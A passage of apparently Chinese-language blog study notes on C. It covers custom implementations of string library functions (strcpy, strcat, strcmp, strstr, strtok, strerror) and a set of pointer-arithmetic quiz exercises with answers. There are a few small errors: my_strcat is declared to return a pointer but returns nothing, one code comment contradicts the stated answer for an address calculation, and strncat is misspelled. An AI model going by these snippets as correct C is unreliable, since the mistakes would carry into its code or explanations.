class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>字符串已经以’\0’作为结束标志，strlen函数返回的是在字符串中’\0’前面出现的字符个数（不包含’\0’）。–{‘a’,’b’}不可以</li><li>参数指向的字符串必须要以’\0’结束</li><li>函数的返回值是size_t，是无符号的</li></ol><h1 id="char-strcpy-char-destination-const-char-source-拷贝字符串"><a href="#char-strcpy-char-destination-const-char-source-拷贝字符串" class="headerlink" title="char* strcpy(char* destination, const char* source)拷贝字符串"></a>char* strcpy(char* destination, const char* source)拷贝字符串</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="comment">//str1 -- destination</span></span><br><span class="line"><span class="comment">//str2 -- source</span></span><br><span class="line"><span class="type">char</span>* <span class="title function_">my_strcpy</span><span class="params">(<span class="type">char</span>* str1,<span class="type">const</span> <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (*str2 != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">*(str1 + i) = *str2;</span><br><span class="line">str2++;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">*(str1 + i) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> str1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span>* p = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">my_strcpy(arr, p);</span><br><span class="line"><span class="built_in">puts</span>(arr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>源字符串必须要以’\0’结束</li><li>会将源字符串中的’\0’拷贝到目标空间</li><li>目标空间必须足够大，以确保能存放源字符串</li><li>目标空间必须可变（不可以是char* str &#x3D; “#####”）</li></ol><h1 id="char-strcat-char-destination-const-char-source-字符串追加"><a href="#char-strcat-char-destination-const-char-source-字符串追加" class="headerlink" title="char* strcat(char* destination, const char* source)字符串追加"></a>char* strcat(char* destination, const char* source)字符串追加</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">my_strcat</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span>* src)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(dest &amp;&amp; src);</span><br><span class="line"><span class="comment">//1.找目标字符串中得\0</span></span><br><span class="line"><span class="keyword">while</span> (*dest) &#123;</span><br><span class="line">dest++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.追加源字符串，连\0一起</span></span><br><span class="line"><span class="keyword">while</span> (*dest++ = *src++) &#123;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr[<span class="number">20</span>] = <span class="string">&quot;hello &quot;</span>;<span class="comment">//world!</span></span><br><span class="line"><span class="type">char</span> arr2[] = <span class="string">&quot;world!&quot;</span>;<span class="comment">//传数组名也可以</span></span><br><span class="line"><span class="comment">//strcat(arr, arr2);</span></span><br><span class="line">my_strcat(arr,<span class="string">&quot;world!&quot;</span>);<span class="comment">//字符串追加（连接）</span></span><br><span class="line"><span class="built_in">puts</span>(arr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 如果需要返回类型为char*</span></span><br><span class="line"><span class="comment">char* my_strcat(char* dest, const char* src)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">char* ret = dest;</span></span><br><span class="line"><span class="comment">assert(dest &amp;&amp; src);</span></span><br><span class="line"><span class="comment">//1.找目标字符串中得\0</span></span><br><span class="line"><span class="comment">while (*dest) &#123;</span></span><br><span class="line"><span class="comment">dest++;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">//2.追加源字符串，连\0一起</span></span><br><span class="line"><span class="comment">while (*dest++ = *src++) &#123;</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">return ret;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ol><li>源字符串必须以’\0’结束</li><li>目标空间必须足够大。</li><li>目标空间必须可以修改</li><li>但不能自己给自己追加</li></ol><h1 id="int-strcmp-const-char-str1-const-char-str2"><a href="#int-strcmp-const-char-str1-const-char-str2" class="headerlink" title="int strcmp(const char* str1, const char* str2)"></a>int strcmp(const char* str1, const char* str2)</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str1, <span class="type">const</span> <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(str1);</span><br><span class="line">assert(str2);</span><br><span class="line"><span class="keyword">while</span> (*str1 == *str2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (*str1 == <span class="string">&#x27;\0&#x27;</span> || *str2 == <span class="string">&#x27;\0&#x27;</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">str1++;</span><br><span class="line">str2++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>  *str1 - *str2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* p = <span class="string">&quot;obcb&quot;</span>;</span><br><span class="line"><span class="type">char</span>* q = <span class="string">&quot;obca&quot;</span>;</span><br><span class="line"><span class="type">int</span> ret = my_strcmp(p, q);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ret);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>第一个字符串大于第二个字符串，则返回大于0得数字</li><li>等于，则返回0</li><li>小于，则返回小于0的数字</li></ol><p><em>strcpy strcat strcmp 长度不受限制的字符串函数</em></p><p><em>strncpy strncay strncmp 长度受限制的字符串，可以控制参与变化的字符串中的字符个数</em></p><h1 id="char-strstr-char-str1-const-char-str2"><a href="#char-strstr-char-str1-const-char-str2" class="headerlink" title="char * strstr (       char * str1, const char * str2 );"></a>char * strstr (       char * str1, const char * str2 );</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">my_strstr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str1, <span class="type">const</span> <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(str1 &amp;&amp; str2);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* s1 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* s2 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* cp = str1;</span><br><span class="line"><span class="keyword">if</span> (*str2 == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">char</span>*)str1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (*cp)</span><br><span class="line">&#123;</span><br><span class="line">s1 = cp;</span><br><span class="line">s2 = str2;</span><br><span class="line"><span class="keyword">while</span> (*s1 &amp;&amp; *s2 &amp;&amp; (*s1 == *s2))</span><br><span class="line">&#123;</span><br><span class="line">s1++;</span><br><span class="line">s2++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (*s2 == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">char</span>*)cp;</span><br><span class="line">&#125;</span><br><span class="line">cp++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr1[] = <span class="string">&quot;abcdefabcdef&quot;</span>;</span><br><span class="line"><span class="type">char</span> arr2[] = <span class="string">&quot;bcd&quot;</span>;</span><br><span class="line"><span class="comment">//在arr1中查找arr2</span></span><br><span class="line"><span class="type">char</span>* ret = my_strstr(arr1, arr2);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;没找到\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到了:%s\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="char-strtok-char-str-const-char-delimiters-字符串切割函数"><a href="#char-strtok-char-str-const-char-delimiters-字符串切割函数" class="headerlink" title="char * strtok ( char * str, const char * delimiters );字符串切割函数"></a>char * strtok ( char * str, const char * delimiters );字符串切割函数</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="comment">//用法</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr1[] = <span class="string">&quot;123@bcda.com&quot;</span>;</span><br><span class="line"><span class="type">char</span>* p = <span class="string">&quot;@.&quot;</span>;</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span>* ret = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (ret = strtok(arr1, p); ret != <span class="literal">NULL</span>;ret=strtok(<span class="literal">NULL</span>,p))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(ret);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><ol><li>sep参数是个字符串，定义了用作分隔符的字符集合</li><li>第一个参数指定一个字符串，它包含了0个或者多个又sep字符串中一个或者多个分隔符分割的标记。</li><li>strtok函数找到str中的下一个标记，并将其用\0结尾，返回一个指向这个标记的指针。（注：strtok函数会改变被操作的字符串，所以在使用strtok函数切分的字符串一般都是用临时拷贝的内容并且可修改。）</li><li>strtok函数的第一个参数不为NULL，函数将找到str中第一个标记，strtok函数将保存它在字符串中的位置。</li><li>strtok函数的第一个参数为NULL，函数将在同一个字符串中被保存的位置开始，朝朝下一个标记。</li><li>如果字符串中不存在更多的标记，则返回NULL指针</li></ol><h1 id="char-strerror-int-errnum-返回错误码，所对应的错误信息"><a href="#char-strerror-int-errnum-返回错误码，所对应的错误信息" class="headerlink" title="char* strerror(int errnum)返回错误码，所对应的错误信息"></a>char* strerror(int errnum)返回错误码，所对应的错误信息</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="comment">//使用库函数的时候可能失败</span></span><br><span class="line"><span class="comment">//会设置错误代码</span></span><br><span class="line"><span class="comment">//int errno;//5</span></span><br><span class="line"><span class="comment">//C语言已经设置好了</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(<span class="number">0</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(<span class="number">1</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(<span class="number">2</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(<span class="number">3</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(<span class="number">4</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/06/ZPfVjiLTNgBovMH.png" alt="image.png"></p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>比如在打开不存在的文件时，会报错，错误码会记录信息，可以通过这个函数打印出信息，errno是c语言定义好的全局变量，用的时候要包含头文件errno.h</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="comment">//使用库函数的时候可能失败</span></span><br><span class="line"><span class="comment">//会设置错误代码</span></span><br><span class="line"><span class="comment">//int errno;//5</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">FILE* pf = fopen(<span class="string">&quot;aszxc.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pf == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fclose(pf);</span><br><span class="line">pf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/06/pEcQfHUOTn9LNkt.png" alt="image.png"></p><h1 id="perror-char-str-直接打印错误信息"><a href="#perror-char-str-直接打印错误信息" class="headerlink" title="perror(char* str)直接打印错误信息"></a>perror(char* str)直接打印错误信息</h1><ol><li>首先把错误码转化为错误信息</li><li>打印错误信息（包含了自定义的信息）</li></ol><h2 id="str自定义信息"><a href="#str自定义信息" class="headerlink" title="str自定义信息"></a>str自定义信息</h2>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指针练习</title>
      <link href="/2023/03/25/%E6%8C%87%E9%92%88%E7%BB%83%E4%B9%A01/"/>
      <url>/2023/03/25/%E6%8C%87%E9%92%88%E7%BB%83%E4%B9%A01/</url>
      
        <content type="html"><![CDATA[<h1 id="指针练习（一）"><a href="#指针练习（一）" class="headerlink" title="指针练习（一）"></a>指针练习（一）</h1><ol><li>下列程序的结果<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="type">int</span>* ptr = (<span class="type">int</span>*)(&amp;a + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>, *(a + <span class="number">1</span>), *(ptr - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>结果是 2，5</p><p>首元素地址+1指第二个元素的地址，即2。&amp;a + 1 指向的是5后面一个的地址，-1又回去了</p><p>2. </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> Num;</span><br><span class="line"><span class="type">char</span>* pcName;</span><br><span class="line"><span class="type">short</span> sDate;</span><br><span class="line"><span class="type">char</span> cha[<span class="number">2</span>];</span><br><span class="line"><span class="type">short</span> sBa[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//假设p的值为0x100000，如下表达式的值分别为多少</span></span><br><span class="line"><span class="comment">//Test的大小是20字节</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, p + <span class="number">0x1</span>);<span class="comment">//0x100014</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)p + <span class="number">0x1</span>);<span class="comment">//0x100001 p被强制转换成整型了</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>*)p + <span class="number">0x1</span>);<span class="comment">//0x100001无符号整型指针+1跳过一个无符号整型即+4</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>前提是32位编译</em><br><img src="https://s2.loli.net/2023/03/25/Byzj3GQ1f4uEOP2.png" alt="image.png"><br> 答：p+0x1指针+1就是指跳过一个Test结构体所以+20</p><p>0x100001 p被强制转换成整型了</p><p>0x100004无符号整型指针+1跳过一个无符号整型即+4<br> <img src="https://s2.loli.net/2023/03/25/T5HVgdj8Y4IfZbC.png" alt="image.png"></p><p> 64位的时候一个指针是8byte你结构体就是32字节了所以+1就是0x20</p><ol start="3"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">4</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line"><span class="type">int</span>* ptr1 = (<span class="type">int</span>*)(&amp;a + <span class="number">1</span>);</span><br><span class="line"><span class="type">int</span>* ptr2 = (<span class="type">int</span>*)((<span class="type">int</span>)a + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x,%x&quot;</span>, ptr1[<span class="number">-1</span>], *ptr2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/25/RHBqZiWdEYsOrPN.png" alt="image.png"></p><p>4,20000</p><p>4：&amp;a + 1刚好在4后面一个，-1又回到4</p><p>而对于ptr2，小端存储</p><p>01 00 00 00 | 02 00 00 00 | 03 00 00 00 | 04 00 00 00 |</p><p>ptr2指向的地址被转换成int后+1 相当于从-&gt;01变为01-&gt;00然后再输出向后数4个byte，即使0x 02 00 00 00</p><ol start="4"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">2</span>] = &#123; (<span class="number">0</span>,<span class="number">1</span>),(<span class="number">2</span>,<span class="number">3</span>),(<span class="number">4</span>,<span class="number">5</span>) &#125;;<span class="comment">// --&gt;&#123;1,3,5&#125;</span></span><br><span class="line"><span class="type">int</span>* p;</span><br><span class="line">p = a[<span class="number">0</span>];<span class="comment">//p -&gt; *(p + 0)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, p[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果 1</p><p>1 | 3<br>5 | 0<br>0 | 0</p><p>括号表达式，算最后一个逗号右边的结果,所以p-&gt;1</p><ol start="5"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span>(*p)[<span class="number">4</span>];</span><br><span class="line">p = a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p,%d\n&quot;</span>, &amp;p[<span class="number">4</span>][<span class="number">2</span>] - &amp;a[<span class="number">4</span>][<span class="number">2</span>], &amp;p[<span class="number">4</span>][<span class="number">2</span>] - &amp;a[<span class="number">4</span>][<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/26/DCvZij19lVN2ALW.png" alt="image.png"></p><p>地址无正负之分，补码的-4是FFFFFFFC,-4</p><p>6. </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> aa[<span class="number">2</span>][<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line"><span class="type">int</span>* ptr1 = (<span class="type">int</span>*)(&amp;aa + <span class="number">1</span>);</span><br><span class="line"><span class="type">int</span>* ptr2 = (<span class="type">int</span>*)(*(aa + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>, *(ptr1 - <span class="number">1</span>), *(ptr2 - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是10，5.10是因为&amp;aa+1指的是跳过整个二维数组，再-1回到最后一个元素。<br>5是因为*（aa + 1）指的是跳过一行，再-1回到第一行最后一个元素5</p><ol start="7"><li><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* a[] = &#123; <span class="string">&quot;work&quot;</span>, <span class="string">&quot;at&quot;</span>, <span class="string">&quot;alibaba&quot;</span> &#125;;</span><br><span class="line"><span class="type">char</span>** pa = a;</span><br><span class="line">pa++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *pa);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>结果at,char* p &#x3D; “abc”,所以char* a[],里面又三个char*,pa++就是指向at</p><ol start="8"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* c[] = &#123; <span class="string">&quot;ENTER&quot;</span>, <span class="string">&quot;NEW&quot;</span>, <span class="string">&quot;POINT&quot;</span>, <span class="string">&quot;FIRST&quot;</span> &#125;;</span><br><span class="line"><span class="type">char</span>** cp[] = &#123;c + <span class="number">3</span>, c + <span class="number">2</span>, c + <span class="number">1</span>, c&#125;;</span><br><span class="line"><span class="type">char</span>*** cpp = cp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, **++cpp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *-- * ++cpp + <span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *cpp[<span class="number">-2</span>] + <span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, cpp[<span class="number">-1</span>][<span class="number">-1</span>] + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/26/OgFkEjHZeVU9q3A.png" alt="image.png"></p><p>注意++cpp，做完运算在第二个表达式中结果保留</p><p>第一个cpp先++指的是c+2，再解引用两次刚好到”POINT”<br>第二个cpp先++指的是c+1,解引用完再–变成c,再解引用指的是”ENTER”,+3刚好从E开始输出ER。<br>第三个cpp[]-&gt;* cpp,然后再解引用即** （cpp-2）+3，cpp-2回到开始的位置，即c+3，解2次引用就是FIRST，+3就是从S开始输出ST<br>第四个是指* (* (cpp - 1) - 1)+1,即先* (cpp - 1) 得到c + 2，再 - 1 得到c + 1,接引用完是”NEW”,再+1指的是从E开始输出EW</p><p><img src="https://s2.loli.net/2023/03/26/sIXVecfFPxo5qBT.png" alt="image.png"></p><ol 